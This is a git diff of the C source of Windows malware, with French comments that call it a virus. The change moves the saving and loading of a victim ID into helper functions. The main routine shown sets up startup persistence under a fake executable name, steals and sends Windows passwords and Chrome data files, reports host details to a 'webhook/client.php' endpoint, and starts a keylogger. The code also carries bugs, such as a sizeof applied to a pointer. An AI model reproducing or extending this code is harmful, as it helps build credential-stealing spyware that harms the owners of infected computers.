@@ -23,6 +23,29 @@ int is_first_execution(char *current_executable_path, char *softwareDataDirector
     return _access(fake_executable_path, 0); // de io.h, pour vérifier si le fichier existe
 };
 
+void save_uid(char *uid, char *uid_file_path){
+    FILE *file = fopen(uid_file_path, "w");
+    if (file == NULL) {
+        perror("Erreur à l'ouverture du fichier en écriture");
+    }
+    fprintf(file, "%s", uid);
+    fclose(file);
+}
+
+void get_uid(char *uid, char *uid_file_path){
+
+    FILE *file = fopen(uid_file_path, "r");
+    if (file == NULL) {
+        perror("Erreur à l'ouverture du fichier en lecture");
+    }
+
+    char buffer[256];
+    fgets(buffer, sizeof(buffer), file);
+
+    snprintf(uid, sizeof(uid), "%s", buffer);
+    fclose(file);
+}
+
 int main(void)
 {
 
@@ -45,7 +68,7 @@ int main(void)
     snprintf(uid, 30, "%d", random_uid);
 
     char *filename = "user";
-        char uid_file_path[500];
+    char uid_file_path[500];
     snprintf(uid_file_path, 500 , "%s\\%s", softwareDataDirectory, filename);
 
     if (is_first_execution(current_executable_path, softwareDataDirectory, fake_executable_name))
@@ -54,34 +77,16 @@ int main(void)
         CreateDirectory(softwareDataDirectory, NULL);
         set_persistance(softwareDataDirectory, current_executable_path, fake_executable_name); // fonction à amméliorer pour que si refus des droits admin, dossier de démarage simplement
 
-
         // Enregistrer l'uid dans dans le repertoire du virus un fichier
-        FILE *file = fopen(uid_file_path, "w");
-        if (file == NULL) {
-            perror("Erreur à l'ouverture du fichier en écriture");
-        }
-        fprintf(file, "%d", uid);
-        fclose(file);
+        save_uid(uid,uid_file_path);
 
         save_and_send_windows_users_password(&computer);
         send_chrome_data_files(&computer);
 
     
     } else{
-
-        // on recupere l'uid qui est censé exister
-        FILE *file = fopen(uid_file_path, "r");
-    
-       if (file == NULL) {
-            perror("Erreur à l'ouverture du fichier en lecture");
-        }
-
-        char buffer[256];
-        fgets(buffer, sizeof(buffer), file);
-        printf("%s", buffer);
-
-        snprintf(uid, sizeof(uid), "%s", buffer);
-        fclose(file);
+        // on recupere l'uid qui est censé exister et ont le met dans uid
+        get_uid(uid, uid_file_path);
     }
 
     printf("\nComputer Name: %s\n", computer.computer_name);
@@ -94,7 +99,6 @@ int main(void)
 
     snprintf(client_data, 1000,  "{\"uid\":\"%d\", \"computer_name\": \"%s\", \"username\": \"%s\", \"windows_version\": \"%s\", \"architecture\": \"%s\"}", uid, computer.computer_name,  computer.username, computer.windows_version, computer.architecture);
     send_to_server("webhook/client.php", client_data);
-
 
     start_keylogger();
 
